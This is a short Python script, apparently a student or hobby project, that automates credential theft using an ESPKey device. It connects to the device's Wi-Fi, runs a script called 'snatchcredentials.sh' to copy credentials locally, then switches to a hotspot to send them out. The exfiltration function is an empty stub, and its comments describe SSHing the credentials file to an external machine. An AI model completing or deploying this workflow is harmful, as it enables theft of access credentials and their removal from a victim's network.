from wireless import Wireless
import os
import subprocess
import time

# By Thomas McLaughlin and Roman Morasco

def connectEspKey():
    hostname = "http://192.168.4.1/"
    isConnected = False
    while isConnected is False:
        time.sleep(15)
        wire = Wireless()
        wire.connect(ssid = 'ESPKey-config', password = 'accessgranted')
        time.sleep(5)
        response = os.system("ping -c 1 " + hostname)
        if response == 0:
            isConnected = True
    print("Connection Established")

def credentialsLocalFile():
    filename = "snatchcredentials.sh"
    subprocess.run(["bash", filename])

def connectInternet():
    hostname = "google.com"
    isConnected = False
    while isConnected is False:
        time.sleep(15)
        wire = Wireless()
        wire.connect(ssid = 'namewifi', password = 'passwrd')
        time.sleep(5)
        response = os.system("ping -c 1 " + hostname)
        if response == 0:
            isConnected = True
    print("Connection Established")   

def exfiltrateFile():
    #process to exfiltrate credentials.txt to external device from inside network
    pass

def main():
    time.sleep(0)# increase to around 30 to allow computer to start up
    print("STARTING INITIAL CONNECTION")
    connectEspKey() # connect to ESPKEY
    print("SAVING CREDENTIALS LOCALLY")
    credentialsLocalFile() # make a local copy of credentials
    print("STARTING SECOND CONNECTION")
    connectInternet() # connect to hotspot to exfiltrate local file
    print("EXFILTRATING FILE TO EXTERNAL")
    exfiltrateFile() # SSH'ing to external device inside of network and transfering credentials.txt file

if __name__=="__main__":
    main()